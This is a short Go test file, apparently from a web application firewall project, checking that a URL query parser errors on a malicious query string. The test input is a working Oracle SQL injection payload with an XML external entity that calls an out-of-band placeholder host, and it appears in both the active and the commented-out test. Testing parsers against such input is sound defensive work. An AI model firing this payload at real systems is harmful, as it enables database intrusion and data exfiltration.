// Copyright 2022 Juan Pablo Tosso
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package url

import (
	"testing"
)

func TestUrlPayloads(t *testing.T) {
	out := `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
	_, err := ParseQuery(out, "&")
	if err == nil {
		t.Error("this payload should return an error")
	}
}

/*
func TestUrlPayloads2(t *testing.T) {
	out := `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
	c, err := url.ParseQuery(out)
	if err != nil {
		t.Error("failed to parse query", err)
	}
	if p, ok := c["var"]; !ok {
		t.Error("Expected var to be in the map, got ", c)
	} else if len(p) != 1 || p[0] != out {
		t.Error("failed to set var")
	}
}
*/
